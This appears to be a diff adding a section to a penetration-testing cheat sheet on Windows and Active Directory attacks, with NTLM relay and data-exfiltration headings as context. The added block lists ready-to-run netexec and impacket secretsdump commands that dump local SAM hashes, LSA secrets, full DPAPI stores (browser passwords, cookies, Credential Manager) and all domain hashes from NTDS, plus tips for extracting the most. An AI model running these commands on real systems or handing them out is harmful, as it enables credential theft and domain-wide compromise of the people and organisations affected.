@@ -53,6 +53,23 @@ impacket-ntlmrelayx -tf relay_targets.txt -smb2support
 # Trigger auth: responder, mitm6, or coerce
 ```
 
+## Post-Auth Credential Dumping (with admin access)
+```bash
+# Run ALL three in order — each extracts different secrets:
+netexec smb <target> -u <user> -p <pass> --sam       # local SAM hashes
+netexec smb <target> -u <user> -p <pass> --lsa       # LSA secrets, cached domain creds
+netexec smb <target> -u <user> -p <pass> --dpapi     # FULL DPAPI: browser passwords, vault, cookies, Credential Manager
+
+# CRITICAL: bare --dpapi = EVERYTHING. Do NOT add subcommands (cookies/nosystem/wifi).
+# Adding subcommands LIMITS output. Always use bare --dpapi first.
+
+# On Domain Controllers:
+netexec smb <dc> -u <user> -p <pass> --ntds          # ALL domain hashes
+
+# Fallback — one-shot via impacket:
+secretsdump.py <domain>/<user>:<pass>@<target>
+```
+
 ## Share Access & Data Exfil
 ```bash
 # Connect and browse
